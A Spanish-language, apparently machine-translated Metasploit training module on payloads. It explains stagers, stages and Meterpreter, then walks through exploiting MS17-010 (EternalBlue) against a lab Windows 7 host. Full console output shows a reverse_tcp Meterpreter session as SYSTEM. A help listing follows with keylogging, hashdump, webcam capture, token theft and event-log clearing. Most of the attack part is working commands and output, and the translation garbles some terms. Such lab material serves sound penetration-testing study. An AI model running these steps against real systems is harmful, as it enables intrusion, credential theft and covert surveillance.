# Payloads

A`Payload`En Metasploit se refiere a un módulo que ayuda al módulo de exploit en (típicamente) devolver un caparazón al atacante. Las cargas útiles se envían junto con la exploit en sí para evitar procedimientos de funcionamiento estándar del servicio vulnerable (`exploits job`) y luego ejecute el sistema operativo objetivo para devolver una conexión inversa al atacante y establecer un punto de apoyo (`payload's job`).

Hay tres tipos diferentes de módulos de carga útil en el marco de MetaSploit: solteros, decisiones y etapas. El uso de tres tipologías de interacción de carga útil será beneficiosa para el Pentester. Puede ofrecer la flexibilidad que necesitamos para realizar ciertos tipos de tareas. Si se organiza una carga útil o no está representado por`/`en el nombre de la carga útil.

Por ejemplo,`windows/shell_bind_tcp`es una sola carga útil sin etapa, mientras que`windows/shell/bind_tcp`consiste en un stager (`bind_tcp`) y una etapa (`shell`).

### **Individual**

A`Single`La carga útil contiene el exploit y todo el código de shell para la tarea seleccionada. Las cargas útiles en línea son por diseño más estables que sus contrapartes porque contienen todo en uno. Sin embargo, algunos exploits no admitirán el tamaño resultante de estas cargas útiles, ya que pueden ser bastante grandes.`Singles`son cargas útiles autónomos. Son el único objeto enviado y ejecutado en el sistema de destino, lo que nos obtiene un resultado inmediatamente después de ejecutar. Una sola carga útil puede ser tan simple como agregar un usuario al sistema de destino o iniciar un proceso.

### **Decisores**

`Stager`Las cargas útiles funcionan con cargas útiles para realizar una tarea específica. Un Stager está esperando en la máquina del atacante, listo para establecer una conexión con el host de la víctima una vez que el escenario complete su ejecución en el host remoto.`Stagers`Se usan típicamente para configurar una conexión de red entre el atacante y la víctima y están diseñados para ser pequeños y confiables. Metasploit usará el mejor y volverá a uno menos preferido cuando sea necesario.

Windows NX vs. No-NX Stagers

- Problema de confiabilidad para NX CPU y DEP
- Los sencillos NX son más grandes (Memoria VirtualAlloc)
- El valor predeterminado ahora es compatible con NX + Win7

### **Etapas**

`Stages`son componentes de carga útil que son descargados por los módulos de Stager. Las diversas etapas de carga útil proporcionan características avanzadas sin límites de tamaño, como meterpreter, inyección VNC y otras. Las etapas de carga útil usan automáticamente los sencillos intermedios:

- Un solo`recv()`falla con grandes cargas
- El stager recibe el stager central
- El Stager Middle luego realiza una descarga completa
- También mejor para RWX

---

# **Cargas útiles**

Una carga útil escenificada es, en pocas palabras, una`exploitation process`Eso es modularizado y funcionalmente separado para ayudar a segregar las diferentes funciones que cumple en diferentes bloques de código, cada uno completando su objetivo individualmente pero trabajando para encadenar el ataque. Esto finalmente otorgará un acceso remoto de un atacante a la máquina de destino si todas las etapas funcionan correctamente.

El alcance de esta carga útil, como con cualquier otra, además de otorgar acceso de shell al sistema objetivo, es ser lo más compacto e discreto posible para ayudar con el antivirus (`AV`) / Sistema de prevención de intrusos (`IPS`) evasión tanto como sea posible.

`Stage0`De una carga útil escenificada representa el código de shell inicial enviado a través de la red al servicio vulnerable de la máquina de destino, que tiene el único propósito de inicializar una conexión a la máquina del atacante. Esto es lo que se conoce como conexión inversa. Como usuario de Metasploit, los cumpliremos con los nombres comunes`reverse_tcp`, `reverse_https`, y`bind_tcp`. Por ejemplo, bajo el`show payloads`Comando, puede buscar las cargas útiles que se parecen a las siguientes:

### **MSF - cargas útiles escenificadas**

Cargas útiles

```
msf6 > show payloads

<SNIP>

535  windows/x64/meterpreter/bind_ipv6_tcp                                normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager
536  windows/x64/meterpreter/bind_ipv6_tcp_uuid                           normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager with UUID Support
537  windows/x64/meterpreter/bind_named_pipe                              normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind Named Pipe Stager
538  windows/x64/meterpreter/bind_tcp                                     normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind TCP Stager
539  windows/x64/meterpreter/bind_tcp_rc4                                 normal  No     Windows Meterpreter (Reflective Injection x64), Bind TCP Stager (RC4 Stage Encryption, Metasm)
540  windows/x64/meterpreter/bind_tcp_uuid                                normal  No     Windows Meterpreter (Reflective Injection x64), Bind TCP Stager with UUID Support (Windows x64)
541  windows/x64/meterpreter/reverse_http                                 normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)
542  windows/x64/meterpreter/reverse_https                                normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)
543  windows/x64/meterpreter/reverse_named_pipe                           normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse Named Pipe (SMB) Stager
544  windows/x64/meterpreter/reverse_tcp                                  normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager
545  windows/x64/meterpreter/reverse_tcp_rc4                              normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager (RC4 Stage Encryption, Metasm)
546  windows/x64/meterpreter/reverse_tcp_uuid                             normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager with UUID Support (Windows x64)
547  windows/x64/meterpreter/reverse_winhttp                              normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (winhttp)
548  windows/x64/meterpreter/reverse_winhttps                             normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTPS Stager (winhttp)

<SNIP>

```

Es menos probable que las conexiones inversas desencadenen sistemas de prevención como el que inicializa la conexión es el host de la víctima, que la mayoría de las veces reside en lo que se conoce como un`security trust zone`. Sin embargo, por supuesto, esta política de confianza no es seguida a ciegas por los dispositivos de seguridad y el personal de una red, por lo que el atacante debe pisar con cuidado incluso con este paso.

El código de Stage0 también tiene como objetivo leer una carga útil más grande y posterior en la memoria una vez que llega. Después de establecer el canal de comunicación estable entre el atacante y la víctima, la máquina del atacante probablemente enviará una etapa de carga útil aún más grande que debería otorgarles acceso de shell. Esta carga útil más grande sería la`Stage1`carga útil. Entraremos en más detalles en las secciones posteriores.

### **Carga útil de meterpreter**

El`Meterpreter`La carga útil es un tipo específico de carga útil multifacética que usa`DLL injection`Para garantizar que la conexión con el host de la víctima sea estable, difícil de detectar mediante comprobaciones simples y persistente a través de reinicios o cambios en el sistema. Meterpreter reside completamente en la memoria del host remoto y no deja rastros en el disco duro, lo que hace que sea muy difícil detectar con técnicas forenses convencionales. Además, los scripts y los complementos pueden ser`loaded and unloaded`dinámicamente según sea necesario.

Una vez que se ejecuta la carga útil de Meterpreter, se crea una nueva sesión, que genera la interfaz Meterpreter. Es muy similar a la interfaz MSFConsole, pero todos los comandos disponibles están dirigidos al sistema de destino, que la carga útil ha "infectado". Nos ofrece una gran cantidad de comandos útiles, que varían de la captura de pulsación de teclas, la recopilación de hash de contraseña, el tapping de micrófono y la captura de captura de captura para suplantación de tokens de seguridad del proceso. Vamos a profundizar en más detalles sobre Meterpreter en una sección posterior.

Usando meterpreter, también podemos`load`en diferentes complementos para ayudarnos con nuestra evaluación. Hablaremos más sobre esto en la sección de complementos de este módulo.

---

# **Buscando cargas útiles**

Para seleccionar nuestra primera carga útil, necesitamos saber qué queremos hacer en la máquina de destino. Por ejemplo, si vamos por la persistencia de acceso, probablemente quisiéramos seleccionar una carga útil de Meterpreter.

Como se mencionó anteriormente, las cargas útiles de Meterpreter nos ofrecen una cantidad significativa de flexibilidad. Su funcionalidad base ya es vasta e influyente. Podemos automatizar y entregar rápidamente combinados con complementos como[Complemento mimikatz de gentilkiwi](https://github.com/gentilkiwi/mimikatz)partes del pentest mientras mantienen una evaluación organizada y efectiva. Para ver todas las cargas útiles disponibles, use la`show payloads`mandar`msfconsole`.

### **MSF - Lista de cargas útiles**

Cargas útiles

```
msf6 > show payloads

Payloads
========

#    Name                                                Disclosure Date  Rank    Check  Description-    ----                                                ---------------  ----    -----  -----------
   0    aix/ppc/shell_bind_tcp                                               manual  No     AIX Command Shell, Bind TCP Inline
   1    aix/ppc/shell_find_port                                              manual  No     AIX Command Shell, Find Port Inline
   2    aix/ppc/shell_interact                                               manual  No     AIX execve Shell for inetd
   3    aix/ppc/shell_reverse_tcp                                            manual  No     AIX Command Shell, Reverse TCP Inline
   4    android/meterpreter/reverse_http                                     manual  No     Android Meterpreter, Android Reverse HTTP Stager
   5    android/meterpreter/reverse_https                                    manual  No     Android Meterpreter, Android Reverse HTTPS Stager
   6    android/meterpreter/reverse_tcp                                      manual  No     Android Meterpreter, Android Reverse TCP Stager
   7    android/meterpreter_reverse_http                                     manual  No     Android Meterpreter Shell, Reverse HTTP Inline
   8    android/meterpreter_reverse_https                                    manual  No     Android Meterpreter Shell, Reverse HTTPS Inline
   9    android/meterpreter_reverse_tcp                                      manual  No     Android Meterpreter Shell, Reverse TCP Inline
   10   android/shell/reverse_http                                           manual  No     Command Shell, Android Reverse HTTP Stager
   11   android/shell/reverse_https                                          manual  No     Command Shell, Android Reverse HTTPS Stager
   12   android/shell/reverse_tcp                                            manual  No     Command Shell, Android Reverse TCP Stager
   13   apple_ios/aarch64/meterpreter_reverse_http                           manual  No     Apple_iOS Meterpreter, Reverse HTTP Inline

<SNIP>

   557  windows/x64/vncinject/reverse_tcp                                    manual  No     Windows x64 VNC Server (Reflective Injection), Windows x64 Reverse TCP Stager
   558  windows/x64/vncinject/reverse_tcp_rc4                                manual  No     Windows x64 VNC Server (Reflective Injection), Reverse TCP Stager (RC4 Stage Encryption, Metasm)
   559  windows/x64/vncinject/reverse_tcp_uuid                               manual  No     Windows x64 VNC Server (Reflective Injection), Reverse TCP Stager with UUID Support (Windows x64)
   560  windows/x64/vncinject/reverse_winhttp                                manual  No     Windows x64 VNC Server (Reflective Injection), Windows x64 Reverse HTTP Stager (winhttp)
   561  windows/x64/vncinject/reverse_winhttps                               manual  No     Windows x64 VNC Server (Reflective Injection), Windows x64 Reverse HTTPS Stager (winhttp)

```

Como se vio anteriormente, hay muchas cargas útiles disponibles para elegir. No solo eso, sino que podemos crear nuestras cargas útiles usando`msfvenom`, pero nos sumergiremos en eso un poco más tarde. Usaremos el mismo objetivo que antes y en lugar de usar la carga útil predeterminada, que es una simple`reverse_tcp_shell`, estaremos usando un`Meterpreter Payload for Windows 7(x64)`.

Desplácese a través de la lista anterior, encontramos la sección que contiene`Meterpreter Payloads for Windows(x64)`.

Cargas útiles

```
   515  windows/x64/meterpreter/bind_ipv6_tcp                                manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager
   516  windows/x64/meterpreter/bind_ipv6_tcp_uuid                           manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager with UUID Support
   517  windows/x64/meterpreter/bind_named_pipe                              manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind Named Pipe Stager
   518  windows/x64/meterpreter/bind_tcp                                     manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind TCP Stager
   519  windows/x64/meterpreter/bind_tcp_rc4                                 manual  No     Windows Meterpreter (Reflective Injection x64), Bind TCP Stager (RC4 Stage Encryption, Metasm)
   520  windows/x64/meterpreter/bind_tcp_uuid                                manual  No     Windows Meterpreter (Reflective Injection x64), Bind TCP Stager with UUID Support (Windows x64)
   521  windows/x64/meterpreter/reverse_http                                 manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)
   522  windows/x64/meterpreter/reverse_https                                manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)
   523  windows/x64/meterpreter/reverse_named_pipe                           manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse Named Pipe (SMB) Stager
   524  windows/x64/meterpreter/reverse_tcp                                  manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager
   525  windows/x64/meterpreter/reverse_tcp_rc4                              manual  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager (RC4 Stage Encryption, Metasm)
   526  windows/x64/meterpreter/reverse_tcp_uuid                             manual  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager with UUID Support (Windows x64)
   527  windows/x64/meterpreter/reverse_winhttp                              manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (winhttp)
   528  windows/x64/meterpreter/reverse_winhttps                             manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTPS Stager (winhttp)
   529  windows/x64/meterpreter_bind_named_pipe                              manual  No     Windows Meterpreter Shell, Bind Named Pipe Inline (x64)
   530  windows/x64/meterpreter_bind_tcp                                     manual  No     Windows Meterpreter Shell, Bind TCP Inline (x64)
   531  windows/x64/meterpreter_reverse_http                                 manual  No     Windows Meterpreter Shell, Reverse HTTP Inline (x64)
   532  windows/x64/meterpreter_reverse_https                                manual  No     Windows Meterpreter Shell, Reverse HTTPS Inline (x64)
   533  windows/x64/meterpreter_reverse_ipv6_tcp                             manual  No     Windows Meterpreter Shell, Reverse TCP Inline (IPv6) (x64)
   534  windows/x64/meterpreter_reverse_tcp                                  manual  No     Windows Meterpreter Shell, Reverse TCP Inline x64

```

Como podemos ver, puede llevar bastante tiempo encontrar la carga útil deseada con una lista tan extensa. También podemos usar`grep`en`msfconsole`Para filtrar términos específicos. Esto aceleraría la búsqueda y, por lo tanto, nuestra selección.

Tenemos que ingresar al`grep`Comando con el parámetro correspondiente al principio y luego el comando en el que debe ocurrir el filtrado. Por ejemplo, supongamos que queremos tener un`TCP`basado`reverse shell`manejado por`Meterpreter`para nuestra exploit. En consecuencia, primero podemos buscar todos los resultados que contienen la palabra`Meterpreter`en las cargas útiles.

### **MSF - Buscando carga útil específica**

Cargas útiles

```
msf6 exploit(windows/smb/ms17_010_eternalblue) > grep meterpreter show payloads

   6   payload/windows/x64/meterpreter/bind_ipv6_tcp                        normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager
   7   payload/windows/x64/meterpreter/bind_ipv6_tcp_uuid                   normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager with UUID Support
   8   payload/windows/x64/meterpreter/bind_named_pipe                      normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind Named Pipe Stager
   9   payload/windows/x64/meterpreter/bind_tcp                             normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind TCP Stager
   10  payload/windows/x64/meterpreter/bind_tcp_rc4                         normal  No     Windows Meterpreter (Reflective Injection x64), Bind TCP Stager (RC4 Stage Encryption, Metasm)
   11  payload/windows/x64/meterpreter/bind_tcp_uuid                        normal  No     Windows Meterpreter (Reflective Injection x64), Bind TCP Stager with UUID Support (Windows x64)
   12  payload/windows/x64/meterpreter/reverse_http                         normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)
   13  payload/windows/x64/meterpreter/reverse_https                        normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)
   14  payload/windows/x64/meterpreter/reverse_named_pipe                   normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse Named Pipe (SMB) Stager
   15  payload/windows/x64/meterpreter/reverse_tcp                          normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager
   16  payload/windows/x64/meterpreter/reverse_tcp_rc4                      normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager (RC4 Stage Encryption, Metasm)
   17  payload/windows/x64/meterpreter/reverse_tcp_uuid                     normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager with UUID Support (Windows x64)
   18  payload/windows/x64/meterpreter/reverse_winhttp                      normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (winhttp)
   19  payload/windows/x64/meterpreter/reverse_winhttps                     normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTPS Stager (winhttp)

msf6 exploit(windows/smb/ms17_010_eternalblue) > grep -c meterpreter show payloads

[*] 14

```

Esto nos da un total de`14`resultados. Ahora podemos agregar otro`grep`comandar después del primero y buscar`reverse_tcp`.

Cargas útiles

```
msf6 exploit(windows/smb/ms17_010_eternalblue) > grep meterpreter grep reverse_tcp show payloads

   15  payload/windows/x64/meterpreter/reverse_tcp                          normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager
   16  payload/windows/x64/meterpreter/reverse_tcp_rc4                      normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager (RC4 Stage Encryption, Metasm)
   17  payload/windows/x64/meterpreter/reverse_tcp_uuid                     normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager with UUID Support (Windows x64)

msf6 exploit(windows/smb/ms17_010_eternalblue) > grep -c meterpreter grep reverse_tcp show payloads

[*] 3

```

Con la ayuda de`grep`, Redujimos la lista de cargas útiles que queríamos hasta menos. Por supuesto, el`grep`El comando se puede usar para todos los demás comandos. Todo lo que necesitamos saber es lo que estamos buscando.

---

# **Selección de cargas útiles**

Igual que con el módulo, necesitamos el número de índice de la entrada que nos gustaría usar. Para establecer la carga útil del módulo seleccionado actualmente, usamos`set payload <no.>`solo después de seleccionar un módulo de exploit para empezar.

### **MSF - Seleccione la carga útil**

Cargas útiles

```
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT          445              yes       The target port (TCP)
   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.

Exploit target:

   Id  Name
   --  ----
   0   Windows 7 and Server 2008 R2 (x64) All Service Packs

msf6 exploit(windows/smb/ms17_010_eternalblue) > grep meterpreter grep reverse_tcp show payloads

   15  payload/windows/x64/meterpreter/reverse_tcp                          normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager
   16  payload/windows/x64/meterpreter/reverse_tcp_rc4                      normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager (RC4 Stage Encryption, Metasm)
   17  payload/windows/x64/meterpreter/reverse_tcp_uuid                     normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager with UUID Support (Windows x64)

msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload 15

payload => windows/x64/meterpreter/reverse_tcp

```

Después de seleccionar una carga útil, tendremos más opciones disponibles para nosotros.

Cargas útiles

```
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT          445              yes       The target port (TCP)
   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.

Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Windows 7 and Server 2008 R2 (x64) All Service Packs

```

Como podemos ver, ejecutando el`show payloads`Comando dentro del módulo de Exploit en sí, MSFConsole ha detectado que el destino es una máquina de Windows, y tales solo se muestran las cargas útiles dirigidas a los sistemas operativos de Windows.

También podemos ver que ha aparecido un nuevo campo de opción, directamente relacionado con lo que contendrán los parámetros de carga útil. Nos centraremos en`LHOST`y`LPORT`(Nuestro atacante IP y el puerto deseado para la inicialización de conexión inversa). Por supuesto, si el ataque falla, siempre podemos usar un puerto diferente y relanzar el ataque.

---

# **Usando cargas útiles**

Tiempo para establecer nuestros parámetros tanto para el módulo de explotación como para el módulo de carga útil. Para la parte de exploit, necesitaremos establecer lo siguiente:

| **Parámetro** | **Descripción** |
| --- | --- |
| `RHOSTS` | La dirección IP del host remoto, la máquina de destino. |
| `RPORT` | No requiere un cambio, solo una comprobación de que estamos en el puerto 445, donde se está ejecutando SMB. |

Para la parte de carga útil, necesitaremos establecer lo siguiente:

| **Parámetro** | **Descripción** |
| --- | --- |
| `LHOST` | La dirección IP del host, la máquina del atacante. |
| `LPORT` | No requiere un cambio, solo una verificación de que el puerto no está en uso. |

Si queremos verificar nuestra dirección IP LHOST rápidamente, siempre podemos llamar al`ifconfig`Comando directamente desde el menú MSFConsole.

### **MSF - Configuración de exploit y carga útil**

Cargas útiles

```
msf6 exploit(**windows/smb/ms17_010_eternalblue**) > ifconfig

**[\*]** exec: ifconfig

tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST> mtu 1500

<SNIP>

inet 10.10.14.15 netmask 255.255.254.0 destination 10.10.14.15

<SNIP>

msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 10.10.14.15

LHOST => 10.10.14.15

msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.10.40

RHOSTS => 10.10.10.40

```

Luego, podemos ejecutar el exploit y ver lo que devuelve. Consulte las diferencias en la siguiente salida:

Cargas útiles

```
msf6 exploit(windows/smb/ms17_010_eternalblue) > run

[*] Started reverse TCP handler on 10.10.14.15:4444
[*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.10.40:445       - Scanned 1 of 1 hosts (100% complete)
[*] 10.10.10.40:445 - Connecting to target for exploitation.
[+] 10.10.10.40:445 - Connection established for exploitation.
[+] 10.10.10.40:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.10.40:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.10.40:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.10.40:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.10.40:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1
[+] 10.10.10.40:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.10.40:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.10.40:445 - Sending all but last fragment of exploit packet
[*] 10.10.10.40:445 - Starting non-paged pool grooming
[+] 10.10.10.40:445 - Sending SMBv2 buffers
[+] 10.10.10.40:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.10.40:445 - Sending final SMBv2 buffers.
[*] 10.10.10.40:445 - Sending last fragment of exploit packet!
[*] 10.10.10.40:445 - Receiving response from exploit packet
[+] 10.10.10.40:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.10.40:445 - Sending egg to corrupted connection.
[*] 10.10.10.40:445 - Triggering free of corrupted buffer.
[*] Sending stage (201283 bytes) to 10.10.10.40
[*] Meterpreter session 1 opened (10.10.14.15:4444 -> 10.10.10.40:49158) at 2020-08-14 11:25:32 +0000
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

meterpreter > whoami

[-] Unknown command: whoami.

meterpreter > getuid

Server username: NT AUTHORITY\SYSTEM

```

El aviso no es una línea de comandos de Windows sino una`Meterpreter`inmediato. El`whoami`El comando, típicamente utilizado para Windows, no funciona aquí. En su lugar, podemos usar el equivalente de Linux de`getuid`. Explorando el`help`El menú nos da más información sobre lo que son capaces de las cargas de meterpreter.

### **MSF - comandos de meterpreter**

Cargas útiles

```
meterpreter > help

Core Commands
=============

    Command                   Description
    -------                   -----------
    ?                         Help menu
    background                Backgrounds the current session
    bg                        Alias for background
    bgkill                    Kills a background meterpreter script
    bglist                    Lists running background scripts
    bgrun                     Executes a meterpreter script as a background thread
    channel                   Displays information or control active channels
    close                     Closes a channel
    disable_unicode_encoding  Disables encoding of Unicode strings
    enable_unicode_encoding   Enables encoding of Unicode strings
    exit                      Terminate the meterpreter session
    get_timeouts              Get the current session timeout values
    guid                      Get the session GUID
    help                      Help menu
    info                      Displays information about a Post module
    IRB                       Open an interactive Ruby shell on the current session
    load                      Load one or more meterpreter extensions
    machine_id                Get the MSF ID of the machine attached to the session
    migrate                   Migrate the server to another process
    pivot                     Manage pivot listeners
    pry                       Open the Pry debugger on the current session
    quit                      Terminate the meterpreter session
    read                      Reads data from a channel
    resource                  Run the commands stored in a file
    run                       Executes a meterpreter script or Post module
    secure                    (Re)Negotiate TLV packet encryption on the session
    sessions                  Quickly switch to another session
    set_timeouts              Set the current session timeout values
    sleep                     Force Meterpreter to go quiet, then re-establish session.
    transport                 Change the current transport mechanism
    use                       Deprecated alias for "load"
    uuid                      Get the UUID for the current session
    write                     Writes data to a channel

Strap: File system Commands
============================

    Command       Description
    -------       -----------
    cat           Read the contents of a file to the screen
    cd            Change directory
    checksum      Retrieve the checksum of a file
    cp            Copy source to destination
    dir           List files (alias for ls)
    download      Download a file or directory
    edit          Edit a file
    getlwd        Print local working directory
    getwd         Print working directory
    LCD           Change local working directory
    lls           List local files
    lpwd          Print local working directory
    ls            List files
    mkdir         Make directory
    mv            Move source to destination
    PWD           Print working directory
    rm            Delete the specified file
    rmdir         Remove directory
    search        Search for files
    show_mount    List all mount points/logical drives
    upload        Upload a file or directory

Strap: Networking Commands
===========================

    Command       Description
    -------       -----------
    arp           Display the host ARP cache
    get proxy      Display the current proxy configuration
    ifconfig      Display interfaces
    ipconfig      Display interfaces
    netstat       Display the network connections
    portfwd       Forward a local port to a remote service
    resolve       Resolve a set of hostnames on the target
    route         View and modify the routing table

Strap: System Commands
=======================

    Command       Description
    -------       -----------
    clearev       Clear the event log
    drop_token    Relinquishes any active impersonation token.
    execute       Execute a command
    getenv        Get one or more environment variable values
    getpid        Get the current process identifier
    getprivs      Attempt to enable all privileges available to the current process
    getsid        Get the SID of the user that the server is running as
    getuid        Get the user that the server is running as
    kill          Terminate a process
    localtime     Displays the target system's local date and time
    pgrep         Filter processes by name
    pkill         Terminate processes by name
    ps            List running processes
    reboot        Reboots the remote computer
    reg           Modify and interact with the remote registry
    rev2self      Calls RevertToSelf() on the remote machine
    shell         Drop into a system command shell
    shutdown      Shuts down the remote computer
    steal_token   Attempts to steal an impersonation token from the target process
    suspend       Suspends or resumes a list of processes
    sysinfo       Gets information about the remote system, such as OS

Strap: User interface Commands
===============================

    Command        Description
    -------        -----------
    enumdesktops   List all accessible desktops and window stations
    getdesktop     Get the current meterpreter desktop
    idle time       Returns the number of seconds the remote user has been idle
    keyboard_send  Send keystrokes
    keyevent       Send key events
    keyscan_dump   Dump the keystroke buffer
    keyscan_start  Start capturing keystrokes
    keyscan_stop   Stop capturing keystrokes
    mouse          Send mouse events
    screenshare    Watch the remote user's desktop in real-time
    screenshot     Grab a screenshot of the interactive desktop
    setdesktop     Change the meterpreters current desktop
    uictl          Control some of the user interface components

Stdapi: Webcam Commands
=======================

    Command        Description
    -------        -----------
    record_mic     Record audio from the default microphone for X seconds
    webcam_chat    Start a video chat
    webcam_list    List webcams
    webcam_snap    Take a snapshot from the specified webcam
    webcam_stream  Play a video stream from the specified webcam

Strap: Audio Output Commands
=============================

    Command       Description
    -------       -----------
    play          play a waveform audio file (.wav) on the target system

Priv: Elevate Commands
======================

    Command       Description
    -------       -----------
    get system     Attempt to elevate your privilege to that of the local system.

Priv: Password database Commands
================================

    Command       Description
    -------       -----------
    hashdump      Dumps the contents of the SAM database

Priv: Timestamp Commands
========================

    Command       Description
    -------       -----------
    timestamp     Manipulate file MACE attributes

```

Bastante ingenioso. Desde extraer hashs de los usuarios de SAM hasta tomar capturas de pantalla y activar cámaras web. Todo esto se hace desde la comodidad de una línea de comandos de estilo Linux. Explorando aún más, también vemos la opción de abrir un canal de shell. Esto nos colocará en la interfaz de línea de comandos de Windows real.

### **MSF - Navegación de meterpreter**

Cargas útiles

```
meterpreter > cd Users
meterpreter > ls

Listing: C:\Users
=================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
40777/rwxrwxrwx   8192  dir   2017-07-21 06:56:23 +0000  Administrator
40777/rwxrwxrwx   0     dir   2009-07-14 05:08:56 +0000  All Users
40555/r-xr-xr-x   8192  dir   2009-07-14 03:20:08 +0000  Default
40777/rwxrwxrwx   0     dir   2009-07-14 05:08:56 +0000  Default User
40555/r-xr-xr-x   4096  dir   2009-07-14 03:20:08 +0000  Public
100666/rw-rw-rw-  174   fil   2009-07-14 04:54:24 +0000  desktop.ini
40777/rwxrwxrwx   8192  dir   2017-07-14 13:45:33 +0000  haris

meterpreter > shell

Process 2664 created.
Channel 1 created.

Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation. All rights reserved.

C:\Users>

```

